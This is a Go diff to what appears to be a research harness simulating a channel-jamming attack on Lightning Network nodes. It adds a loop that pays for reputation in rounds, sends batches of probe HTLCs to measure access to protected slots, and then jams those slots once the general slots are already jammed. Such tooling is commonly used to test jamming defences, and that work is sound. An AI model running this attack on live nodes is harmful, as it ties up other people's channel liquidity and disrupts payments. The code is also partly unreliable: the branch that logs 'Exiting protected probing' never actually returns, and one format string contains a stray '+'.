@@ -38,14 +38,9 @@ func runAttack(ctx context.Context, graph *GraphHarness,
 
 	// Once endorsement has been built up, we've at least reached the
 	// threshold reputation required to get a htlc endorsed. We'll now
-	// pre-pay the amount of fees required to get all of our htlcs in the
-	// protected bucket endorsed. We need this because we account for HTLC
-	// opportunity cost as they're added in-flight, so we need a buffer of
-	// fees to get many HTLCs endorsed at once.
-	if err := prepayHTLCs(ctx, jammer, targetNode); err != nil {
-		return fmt.Errorf("prepay htlcs: %w", err)
-	}
-
+	// take two steps:
+	// 1. Slow jam general slots with one of our nodes
+	// 2. Build reputation for access to protected slots with the other
 	chans, err := slowJamGeneral(ctx, jammer)
 	if err != nil {
 		return fmt.Errorf("slow jamming: %w", err)
@@ -81,6 +76,12 @@ func runAttack(ctx context.Context, graph *GraphHarness,
 	)
 	if err != nil {
 		return fmt.Errorf("0 -> 2: %w", err)
+	}
+
+	log.Print("Paying for reputation to access protected slots")
+	err = buildReputationForProtected(ctx, jammer, zeroToTwo, targetNode)
+	if err != nil {
+		return fmt.Errorf("Build protected reputation: %w", err)
 	}
 
 	protectedChans, err := jamProtected(ctx, jammer, zeroToTwo)
@@ -259,40 +260,192 @@ func slowJamGeneral(ctx context.Context, j *JammingHarness) (
 	return jamChans, nil
 }
 
-func prepayHTLCs(ctx context.Context, j *JammingHarness,
-	target route.Vertex) error {
+type paymentReport struct {
+	dispatchedPmts int
+	targetFailed   int
+	peerFailed     int
+	htlcReceived   int
+}
 
-	// First, get the route that we'll use for this HTLC.
-	probeAmt := lnwire.MilliSatoshi(400_000)
-	zeroToTwo, err := j.LndNodes.GetNode(0).Client.QueryRoutes(
-		ctx,
-		lndclient.QueryRoutesRequest{
-			PubKey:       j.LndNodes.GetNode(2).NodePubkey,
-			AmtMsat:      probeAmt,
-			FeeLimitMsat: lnwire.MaxMilliSatoshi,
-		},
-	)
-	if err != nil {
-		return fmt.Errorf("0 -> 2: %w", err)
+func (p *paymentReport) reportResponse(i int, r JammingPaymentResp) error {
+	if r.SendFailure == lnrpc.PaymentFailureReason_FAILURE_REASON_NONE {
+		return fmt.Errorf("Probe: %v not failed back", i)
 	}
 
-	costPerHTLC, err := getHTLCPrepay(zeroToTwo.Hops, target)
+	if len(r.FailureIdx) == 0 {
+		return fmt.Errorf("Probe: %v has no failed htlcs", i)
+	}
+
+	for _, idx := range r.FailureIdx {
+		switch idx {
+		case 0:
+			return fmt.Errorf("Probe: %v failed at source", i)
+
+		case 1:
+			p.targetFailed++
+
+		case 2:
+			p.peerFailed++
+
+		case 3:
+			p.htlcReceived++
+
+		default:
+			return fmt.Errorf("unexpected failure index: %v", idx)
+		}
+	}
+
+	return nil
+}
+
+func (p *paymentReport) String() string {
+	return fmt.Sprintf("%v sent, target failed: %v peer failed: %v, "+
+		"reached attacker: %v", p.dispatchedPmts, p.targetFailed,
+		p.peerFailed, p.htlcReceived)
+}
+
+func buildReputationForProtected(ctx context.Context, j *JammingHarness,
+	route *lndclient.QueryRoutesResponse, target route.Vertex) error {
+
+	var (
+		// In our first round, we'll just pay enough for a few htlcs to
+		// get protected access. We don't want to overpay for htlcs
+		// that won't go through due to liquidity concerns.
+		htlcToPay       = 10
+		htlcsPaidFor    = 0
+		prevReachedDest = 0
+	)
+
+	for {
+		err := prepayHTLCs(ctx, j, htlcToPay, route, target)
+		if err != nil {
+			return err
+		}
+
+		htlcsPaidFor += htlcToPay
+
+		result, err := probeProtectedAccess(ctx, j, route)
+		if err != nil {
+			return err
+		}
+
+		log.Printf("Protected probes: %v. Total paid "+
+			"for: %v", result, htlcsPaidFor)
+
+		// We don't want to keep paying for reputation if our htlcs
+		// aren't going to get through due to liquidity constraints.
+		// Check that we're still getting more htlcs through than our
+		// last attempt, and exit if not (the issue is no longer
+		// reputation if paying more doesn't increase our success).
+		if result.htlcReceived <= prevReachedDest {
+			log.Printf("Exiting protected probing: %v received +"+
+				"<= %v on previous attempt",
+				result.htlcReceived, prevReachedDest)
+		}
+		prevReachedDest = result.htlcReceived
+
+		// If any HTLCs failed at the target node, it may be because:
+		// 1. We don't have sufficient reputation
+		// 2. The node does not have enough liquidity
+		//
+		// We continue to gradually pay for htlcs to build more
+		// reputation to gain access to htlc slots.
+		htlcToPay = result.targetFailed
+		if htlcToPay > 30 {
+			htlcToPay = 30
+		}
+
+		if htlcToPay == 0 {
+			log.Print("No htlcs failed at target, prepay complete")
+			return nil
+		}
+	}
+}
+
+// probeProtectedAccess sends a set of probes over the route provided to check
+// how much access we have to protected slots on the targeted channel.
+//
+// This function assumes that the general slots on the target channel have
+// already been jammed so that we can focus on the protected slots.
+func probeProtectedAccess(ctx context.Context, j *JammingHarness,
+	route *lndclient.QueryRoutesResponse) (*paymentReport,
+	error) {
+
+	var (
+		protected   = 483 / 2
+		respChans   []<-chan JammingPaymentResp
+		cancelChans []chan struct{}
+	)
+
+	timeout := time.Tick(time.Minute)
+	var results paymentReport
+
+	for i := 0; i < protected; i++ {
+		cancel := make(chan struct{})
+		cancelChans = append(cancelChans, cancel)
+
+		req0 := JammingPaymentReq{
+			AmtMsat:         route.TotalAmtMsat - route.TotalFeesMsat,
+			SourceIdx:       0,
+			DestIdx:         2,
+			EndorseOutgoing: true,
+			EarlySettle:     cancel,
+			SettleWait:      time.Minute,
+			Settle:          false,
+		}
+
+		resp, err := j.JammingPaymentRoute(ctx, req0, *route)
+		if err != nil {
+			return nil, fmt.Errorf("probe: %v failed: %v", i, err)
+		}
+		respChans = append(respChans, resp)
+
+		results.dispatchedPmts++
+	}
+
+	for i, resp := range respChans {
+		select {
+		// Do *not* risk reputation here, abort everything if we get
+		// near our threshold.
+		case <-timeout:
+			for _, c := range cancelChans {
+				close(c)
+			}
+
+			// Once we've ticked once, replace with another channel
+			// that will never have a result so we don't hit this
+			// branch anymore.
+			timeout = make(<-chan time.Time)
+
+		case r := <-resp:
+			if r.Err != nil {
+				return nil, fmt.Errorf("Probe: %v failed: %v", i, r.Err)
+			}
+
+			if err := results.reportResponse(i, r); err != nil {
+				return nil, err
+			}
+		}
+	}
+
+	return &results, nil
+}
+
+func prepayHTLCs(ctx context.Context, j *JammingHarness, n int,
+	prepayRoute *lndclient.QueryRoutesResponse, target route.Vertex) error {
+
+	costPerHTLC, err := getHTLCPrepay(prepayRoute.Hops, target)
 	if err != nil {
 		return fmt.Errorf("cost per htlc: %w", err)
 	}
 
-	log.Printf("HTLC opportunity cost: %v", costPerHTLC)
+	totalPayable := costPerHTLC * lnwire.MilliSatoshi(n)
 
-	// Prepay enough to get all HTLCs in the protected resources endorsed.
-	// TODO: this assumes that we're splitting 50/50.
-	total := costPerHTLC * 483 / 2
+	log.Printf("Paying HTLC opportunity cost: %v for %v HTLCs",
+		costPerHTLC, n)
 
-	return payFeeTotal(ctx, total, target, j)
-}
-
-func payFeeTotal(ctx context.Context, totalPayable lnwire.MilliSatoshi,
-	target route.Vertex, j *JammingHarness) error {
-
+	// Get the route we'll use to build reputation, which is between our
+	// own nodes so we don't inflate the value of other links.
 	pmtAmt := lnwire.MilliSatoshi(555_000_000)
 	route, err := j.LndNodes.GetNode(0).Client.QueryRoutes(
 		ctx,
